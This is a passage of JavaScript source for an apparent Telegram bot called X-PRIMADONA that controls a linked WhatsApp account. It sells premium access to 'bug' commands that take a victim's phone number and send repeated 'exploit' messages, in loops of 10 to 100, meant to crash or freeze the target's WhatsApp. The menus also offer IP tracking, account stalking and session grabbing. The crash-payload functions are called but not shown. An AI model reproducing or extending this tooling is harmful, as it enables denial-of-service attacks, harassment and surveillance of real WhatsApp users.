⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

╰➤ INFORMATION:
 ▢ Developer: @ZyuuOffc
 ▢ Version: 8.0 Gen 4
 ▢ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
#- 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const styles = ["primary", "success", "danger"];

let styleIndex = 0;
let menuAnimation = null;

function getCurrentStyle() {
    return styles[styleIndex];
}

function rotateStyle() {

    styleIndex++;

    if (styleIndex >= styles.length) {
        styleIndex = 0;
    }

}

function button(text, callback_data, emoji = "5832251986635920010") {
    return {
        text,
        callback_data,
        style: getCurrentStyle(),
        icon_custom_emoji_id: emoji
    };
}

function urlButton(text, url, emoji = "5807868868886009920") {
    return {
        text,
        url,
        style: getCurrentStyle(),
        icon_custom_emoji_id: emoji
    };
}

function startKeyboard() {

    return [
        [
            button(
                "𝙲𝙾𝙽𝚃𝚁𝙾𝙻",
                "/controls",
                "5366073534793671550"
            ),
            button(
                "𝚃𝚁𝙰𝚂𝙷",
                "/bug",
                "5357317569650911348"
            )
        ],
        [
            button(
                "𝚂𝚄𝙿𝙿𝙾𝚁𝚃",
                "/tqto",
                "5807868868886009920"
            ), 
            button(
               "𝚃𝙾𝙾𝙻𝚂",
                "/tools",
                "5366073534793671550"
            )
        ],
        [
            urlButton(
                "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁",
                "https://t.me/ZyuuOffc"
            ),
        ],
    ];

}

function stopMenuAnimation() {

    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }

}

function startAnimation(ctx, messageId) {

    stopMenuAnimation();

    menuAnimation = setInterval(async () => {

        try {

            rotateStyle();

            await ctx.telegram.editMessageReplyMarkup(
                ctx.chat.id,
                messageId,
                undefined,
                {
                    inline_keyboard: startKeyboard()
                }
            );

        } catch (e) {}

    }, 2000);

}

// ============ FUNGSI GET START CAPTION ============
function getStartCaption(ctx) {
    const senderStatus = isWhatsAppConnected ? "✅ Connected" : "❌ Disconnected";
    const runtimeStatus = formatRuntime();
    const user = ctx.from;
    const username = user.username ? `@${user.username}` : "Tidak ada";
    const userId = user.id;
    const isPremium = isPremiumUser(userId) ? "✅ Premium" : "❌ Free User";

    return `
<blockquote><tg-emoji emoji-id="5197429921634346862">✨</tg-emoji> 〔 𝚇-ᴘʀɪᴍᴀᴅᴏɴᴀ 〕
x-ᴘʀɪᴍᴀᴅᴏɴᴀ ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4918408122868958076">✨</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @ZyuuOffc <tg-emoji emoji-id="5433758796289685818">👑</tg-emoji>
┋<tg-emoji emoji-id="4918408122868958076">✨</tg-emoji> ᴠᴇʀsɪᴏɴ : 8.0 Gen 4 <tg-emoji emoji-id="4956461073550017373">✨</tg-emoji>
┋<tg-emoji emoji-id="4918408122868958076">✨</tg-emoji> sᴛᴀᴛᴜs : ${isPremium}</blockquote>
<blockquote>〔 Informasi Bot 〕
━━━━━━━━━━━━━━━━━━━━━━
⍑<tg-emoji emoji-id="5258514780469075716">✨</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}
⍑<tg-emoji emoji-id="5893102202817352158">✨</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${runtimeStatus}
⍑<tg-emoji emoji-id="6044381091400257627">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : ${username}
⍑<tg-emoji emoji-id="5334890573281114250">✨</tg-emoji> ᴜsᴇʀ ɪᴅ : ${userId}</blockquote>
`;
}

bot.use((ctx, next) => {

    if (secureMode) return;

    return next();

});

bot.start(async (ctx) => {

    stopMenuAnimation();

    const startCaption = getStartCaption(ctx);

    const msg = await ctx.replyWithPhoto(
        thumbnailUrl,
        {
            caption: startCaption,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: startKeyboard()
            }
        }
    );

    startAnimation(ctx, msg.message_id);

});

bot.action("/start", async (ctx) => {

    stopMenuAnimation();

    try {
        const startCaption = getStartCaption(ctx);

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: thumbnailUrl,
                caption: startCaption,
                parse_mode: "HTML"
            },
            {
                reply_markup: {
                    inline_keyboard: startKeyboard()
                }
            }
        );

        const messageId = ctx.update.callback_query.message.message_id;

        startAnimation(ctx, messageId);

    } catch (e) {

        await ctx.answerCbQuery();

    }

});
// ============ ACTION /controls ============
bot.action("/controls", async (ctx) => {

    await ctx.answerCbQuery();
    stopMenuAnimation();

    const text = `
<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 8.0 Gen 4
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ZyuuOffc
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────o
#- ⌜ 𝗔𝗞𝗦𝗘𝗦 𝗠𝗘𝗡𝗨 ⌟
┊✦ /requestpair - Add Sender Number
┊✦ /setcooldown - Set Bot Cooldown
┊✦ /resetsession - Reset Existing Session
┊✦ /addpremium - Add Premium Users
┊✦ /delpremium - Delete Premium Users
┊✦ /addgcpremium - Add Premium Group
┊✦ /delgcpremium - Delete Premium Group
──────────────────────────</blockquote>
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                            callback_data: "/start", 
                            style: "success"
                        }
                    ]
                ]
            }
        }
    );

});

bot.action("/bug", async (ctx) => {

    await ctx.answerCbQuery();
    stopMenuAnimation();

    const text = `<blockquote>──────────────────────────
#- ⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 ⌟
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /midona
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Forclose Click
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Zverxy
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Buldozer
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Zyuxtra
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Delay Visible
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Vitaltys
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Blank Click
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Spamx
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Khusus Murbug
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /Zverxy
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Khusus Murbug
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /testfunction
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Use Your Own Function
──────────────────────────</blockquote>
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                            callback_data: "/start", 
                            style: "success"
                        }
                    ]
                ]
            }
        }
    );

});

bot.action("/tqto", async (ctx) => {

    await ctx.answerCbQuery();
    stopMenuAnimation();

    const text = `
<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 8.0 Gen 4
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ZyuuOffc
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ⌟
┊ ⓘ @ZyuuOffc ( 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 )
──────────────────────────</blockquote>
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                            callback_data: "/start", 
                            style: "success"
                        }
                    ]
                ]
            }
        }
    );

});

bot.action("/tools", async (ctx) => {

    await ctx.answerCbQuery();
    stopMenuAnimation();

    const text = `
<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 8.0 Gen 4
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ZyuuOffc
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗧𝗢𝗢𝗟𝗦 𝗠𝗨𝗦𝗜𝗖 ⌟
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /spotify
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Play Music Spotify
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /brat
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Teks To Sticker
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /iqc
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Teks To Photo
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /trackip
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Track Ip
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /hentai
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Bokep Jer
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /info
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Info User
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /pinterst
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Stalk Account Pinterest
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /ig
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Stalk account Instagram
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /gempa
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Cek Gempa
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /cekidch
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Check Id Channel
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /shortlink
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Short Link
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /cekfunc
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Check Function Bug
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /gethtml
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Get Html
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /getsession
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Get Session
┊ <tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /tesfunc
┊ <tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> Test Function BBu
──────────────────────────</blockquote>
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                            callback_data: "/start", 
                            style: "success"
                        }
                    ]
                ]
            }
        }
    );

});

bot.action("/about", async (ctx) => {

    await ctx.answerCbQuery();
    stopMenuAnimation();

    const text = `
<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙓-𝙋𝙍𝙄𝙈𝘼𝘿𝙊𝙉𝘼 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 8.0 Gen 4
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ZyuuOffc
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗞𝗘𝗧𝗘𝗥𝗔𝗡𝗚𝗔𝗡 ⌟
✦ Script ini dibuat oleh team PRIMADONA PROJECT.

✦ Disclaimer :
Team X-PRIMADONA PROJECT tidak bertanggung jawab atas penyalahgunaan script ini.
Gunakan untuk memberantas ripper atau scammer di whatsapp,
dan bukan untuk merusak sistem atau mengganggu pengguna lain.
Thank you to all of you
──────────────────────────</blockquote>
`;

    await ctx.editMessageCaption(
        text,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                            callback_data: "/start", 
                            style: "success"
                        }
                    ]
                ]
            }
        }
    );

});

// CASE MURBUG DISINI \\
bot.command("Zverxy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /Zverxy 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝙿𝚁𝙸𝙼𝙰𝙳𝙾𝙽𝙰\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ɪᴏs
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
          url: `https://wa.me/${q}`,
          style: "danger"
        }
      ]
    ]
  }
}
);
    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY IOS TO: ${q} ]`)
        );
        await VnXNewForceIphoneSw(sock, target, true);
        await sleep(1500);
      }
    })();

  }
);

//CASE BUG DISINI \\
bot.command("Zverdon", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Zverdon 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Zverdon
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await onoakanbe(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Zverdon
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("Spamx", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /Spamx 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`𝚇-𝙿𝚁𝙸𝙼𝙰𝙳𝙾𝙽𝙰\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
